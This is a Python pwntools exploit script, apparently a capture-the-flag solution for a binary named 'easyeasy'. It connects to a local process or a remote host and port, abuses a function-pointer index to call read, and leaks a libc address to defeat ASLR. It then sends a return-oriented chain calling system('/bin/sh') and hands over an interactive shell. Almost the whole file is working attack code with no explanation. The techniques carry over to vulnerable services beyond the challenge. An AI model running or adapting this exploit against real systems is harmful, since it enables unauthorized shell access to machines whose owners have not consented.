#!/usr/bin/env python2
# -*- coding: utf-8 -*- #
from pwn import *

DEBUG = 0
LOCAL = 1
VERBOSE = 1

def call_byte(program, addr):
    program.sendline('4')
    program.sendline('1')
    # 32=0x20 恰好为最后一个函数指针的位置
    program.sendline('32')
    

    for i in range(3):
        program.sendline('4')
        program.sendline('4')

    program.recvuntil('Give me your luckynum:\n')

    program.sendline(str(addr))

def call(program, rbp, addr_list):
    call_byte(program, 0xAF) #call read
    payload = 'a' * 8 + p64(rbp)
    for addr in addr_list:
        payload += p64(addr)
    
    program.send(payload)

def get_libc_addr(program, libc):
    program.send('a' * 0x7 + '[')
    program.recvuntil('[')
    addr = u64(program.recv(6) + '\x00\x00') # _IO_stdfile_2_lock wtf????

    program.recvuntil('5. exit\n')
    program.sendline('1')
    program.sendline('10')
    program.sendline('plusls')
    program.recvuntil('Success!')
    program.recvuntil('5. exit\n')

    libc_addr = addr - libc.bss(4176)
    log.info('libc addr=' + hex(libc_addr))
    log.info('system addr=' + hex(libc_addr + libc.symbols['system']))
    
    return libc_addr

def main():
    if VERBOSE:
        context.log_level = 'debug'
    if LOCAL:
        program = process('./easyeasy')
    else:
        program = remote('117.34.105.149', 1251)
    if DEBUG:
        gdb.attach(program)

    libc = ELF('libc.so.6')
    libc_addr = get_libc_addr(program, libc)

    addr_list = [0x4010b3,libc_addr + list(libc.search('/bin/sh'))[0], libc_addr + libc.symbols['system']]
    

    call(program, u64('aaaaaaaa'), addr_list)

    program.interactive()

if __name__ == '__main__':
    main()
